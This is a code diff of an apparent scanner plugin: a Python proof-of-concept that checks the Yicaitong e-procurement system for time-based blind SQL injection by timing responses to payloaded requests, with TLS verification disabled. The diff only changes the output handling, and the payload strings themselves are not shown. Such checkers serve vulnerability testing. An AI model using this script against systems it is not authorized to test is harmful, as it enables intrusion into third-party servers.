@@ -14,8 +14,8 @@ description: 一采通多处时间盲注。
 import sys
 import time
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class caitong_multi_sleep_sqli_BaseVerify:
     def __init__(self, url):
@@ -42,12 +42,12 @@ class caitong_multi_sleep_sqli_BaseVerify:
                 vulnurl = self.url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=20, verify=False)
                 if time.time() - start_time >= 6:
-                    cprint("[+]存在一采通电子采购系统时间盲注漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    return "[+]存在一采通电子采购系统时间盲注漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = caitong_multi_sleep_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
